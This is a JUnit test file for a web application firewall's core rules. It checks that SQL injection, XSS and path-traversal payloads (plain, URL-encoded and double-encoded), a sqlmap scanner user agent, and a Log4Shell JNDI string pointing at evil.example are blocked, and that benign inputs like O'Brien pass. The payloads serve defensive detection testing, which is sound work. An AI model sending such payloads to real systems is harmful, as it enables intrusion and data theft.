package io.aegis.corerules;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

/** The scoring and detection cases named in docs/product.md section 9, one test each. */
class AcceptanceCriteriaTest {

    private static final String BROWSER = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0";
    private static final String SQLMAP = "sqlmap/1.7.2#stable (https://sqlmap.org)";
    private static final String FORM = "application/x-www-form-urlencoded";

    private final CoreRules core = CoreRules.shared();

    private CoreRules.Outcome get(String target, String userAgent) {
        return core.evaluate(CorpusRequest.get(target, userAgent));
    }

    private CoreRules.Outcome post(String target, String body) {
        return core.evaluate(CorpusRequest.of("POST", target, BROWSER, FORM, body));
    }

    @Test
    void aScannerUserAgentAlonePassesWithAScoreBelowTheThreshold() {
        CoreRules.Outcome outcome = get("/products?id=1", SQLMAP);

        assertThat(outcome.blocked()).isFalse();
        assertThat(outcome.score()).isEqualTo(3);
    }

    @Test
    void aScannerUserAgentPlusAQuoteCommentBlocks() {
        assertThat(get("/products?id=1%27--", SQLMAP).blocked()).isTrue();
    }

    @Test
    void aQuoteCommentAloneWithABrowserPasses() {
        assertThat(get("/products?id=1%27--", BROWSER).blocked()).isFalse();
    }

    @Test
    void obrienInAFormFieldPasses() {
        CoreRules.Outcome outcome = post("/register", "last_name=O%27Brien");

        assertThat(outcome.blocked()).isFalse();
        assertThat(outcome.sids()).isEmpty();
    }

    @Test
    void doubleDashInACommentFieldPasses() {
        CoreRules.Outcome outcome = post("/comment", "comment=Great+product+--+would+buy+again");

        assertThat(outcome.blocked()).isFalse();
        assertThat(outcome.sids()).isEmpty();
    }

    @Test
    void plainSqlInjectionBlocks() {
        assertThat(get("/item?id=1+UNION+SELECT+1,2,3--", BROWSER).blocked()).isTrue();
    }

    @Test
    void encodedSqlInjectionBlocks() {
        assertThat(get("/item?id=1%20union%20select%201,2,3--", BROWSER).blocked()).isTrue();
    }

    @Test
    void doubleEncodedSqlInjectionBlocks() {
        assertThat(get("/item?id=1%2520union%2520select%25201,2,3", BROWSER).blocked()).isTrue();
    }

    @Test
    void plainXssBlocks() {
        assertThat(get("/search?q=<script>alert(1)</script>", BROWSER).blocked()).isTrue();
    }

    @Test
    void encodedXssBlocks() {
        assertThat(get("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", BROWSER).blocked()).isTrue();
    }

    @Test
    void doubleEncodedXssBlocks() {
        assertThat(get("/search?q=%253Cscript%253Ealert(1)%253C/script%253E", BROWSER).blocked()).isTrue();
    }

    @Test
    void plainPathTraversalBlocks() {
        assertThat(get("/download?file=../../../../etc/passwd", BROWSER).blocked()).isTrue();
    }

    @Test
    void encodedPathTraversalBlocks() {
        assertThat(get("/download?file=..%2f..%2f..%2fetc%2fpasswd", BROWSER).blocked()).isTrue();
    }

    @Test
    void doubleEncodedPathTraversalBlocks() {
        assertThat(get("/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", BROWSER).blocked()).isTrue();
    }

    @Test
    void log4ShellInAUserAgentBlocks() {
        assertThat(get("/home", "${jndi:ldap://evil.example/a}").blocked()).isTrue();
    }
}
